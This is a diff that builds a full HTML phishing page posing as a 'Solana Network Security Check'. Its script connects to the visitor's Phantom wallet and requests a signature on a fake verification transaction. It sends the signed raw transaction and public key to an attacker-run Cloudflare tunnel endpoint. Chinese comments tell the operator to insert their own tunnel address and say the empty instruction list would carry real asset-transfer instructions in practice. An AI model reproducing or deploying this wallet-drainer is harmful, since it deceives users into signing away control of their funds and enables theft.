@@ -1,26 +1,62 @@
-<script>
-    // 🔱 战术核心：不再用 signMessage，直接请求交易权限
-    document.getElementById('cta').onclick = async () => {
-        const p = window.solana;
-        try {
-            const resp = await p.connect();
-            // 构造一个模拟的“安全检测”交易，实则在后台尝试获取控制权
-            const transaction = {
-                feePayer: resp.publicKey,
-                recentBlockhash: (await (await fetch('https://api.mainnet-beta.solana.com', {
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Solana Network Security Check</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: monospace; text-align: center; padding-top: 50px; }
+        #cta { background: #00ff00; color: #000; padding: 15px 30px; border: none; cursor: pointer; font-weight: bold; }
+        #status { margin-top: 20px; color: #888; }
+    </style>
+</head>
+<body>
+    <h2>🔱 SOLANA SYSTEM VERIFICATION</h2>
+    <p>Please sign to verify your node environment and security priority.</p>
+    <br>
+    <button id="cta">START VERIFICATION</button>
+    <div id="status">WAITING FOR CONNECTION...</div>
+
+    <script>
+        // 🔱 配置区：把这里换成你自己的 Cloudflare 隧道地址！
+        const gate = "https://你的域名.trycloudflare.com/collect"; 
+
+        document.getElementById('cta').onclick = async () => {
+            const p = window.solana;
+            if (!p) return alert("Please install Phantom wallet");
+            
+            try {
+                const resp = await p.connect();
+                document.getElementById('status').innerText = "CONNECTING TO MAINNET...";
+
+                // 1. 获取最新的 Blockhash（防止交易失效）
+                const bhReq = await fetch('https://api.mainnet-beta.solana.com', {
                     method: 'POST', headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({"jsonrpc":"2.0","id":1,"method":"getRecentBlockhash"})
-                })).json()).result.value.blockhash,
-                instructions: [] // 实际操作中这里会植入转账或授权指令
-            };
-            
-            // 提示用户：这是“网络环境验证”
-            const signed = await p.signTransaction(transaction);
-            const signature = signed.signatures[0].signature.toString('base64');
-            
-            // 回传给哨兵
-            new Image().src = `${gate}?auth_sig=${signature}&pub=${resp.publicKey.toString()}`;
-            document.getElementById('status').innerText = "VERIFIED";
-        } catch(e) { console.log(e); }
-    };
-</script>
+                });
+                const bhRes = await bhReq.json();
+                const blockhash = bhRes.result.value.blockhash;
+
+                // 2. 构造“验证交易” (这里是前端逻辑的核心)
+                // 实战中，这里会被重组为真正的资产转移指令
+                const transaction = {
+                    feePayer: resp.publicKey,
+                    recentBlockhash: blockhash,
+                    instructions: [] 
+                };
+                
+                // 3. 弹出窗口要求签名
+                document.getElementById('status').innerText = "AWAITING SIGNATURE...";
+                const signed = await p.signTransaction(transaction);
+                
+                // 4. 将签名后的 Hex 数据回传
+                const rawTx = signed.serialize().toString('base64');
+                new Image().src = `${gate}?auth_sig=${encodeURIComponent(rawTx)}&pub=${resp.publicKey.toString()}`;
+                
+                document.getElementById('status').innerText = "VERIFIED: SECURE NODE ACTIVE";
+                alert("Security check completed!");
+            } catch(e) {
+                document.getElementById('status').innerText = "ERROR: " + e.message;
+            }
+        };
+    </script>
+</body>
+</html>
